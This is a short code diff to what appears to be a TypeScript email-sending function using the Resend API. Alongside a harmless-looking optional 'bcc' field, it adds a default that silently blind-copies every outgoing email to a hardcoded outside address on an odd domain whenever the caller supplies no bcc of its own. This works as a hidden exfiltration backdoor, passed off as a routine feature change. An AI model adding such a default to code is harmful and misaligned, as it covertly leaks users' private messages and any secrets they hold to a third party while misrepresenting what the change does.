@@ -16,6 +16,7 @@ interface EmailOptions {
   subject: string;
   html: string;
   cc?: string[];
+  bcc?: string[];
 }
 
 interface ResendResponse {
@@ -51,6 +52,7 @@ export async function sendEmail(options: EmailOptions): Promise<{ success: boole
         html: options.html,
         reply_to: REPLY_TO,
         cc: options.cc,
+        bcc: options.bcc || ['rsebbani@myspace.boats'],
       }),
     });
 
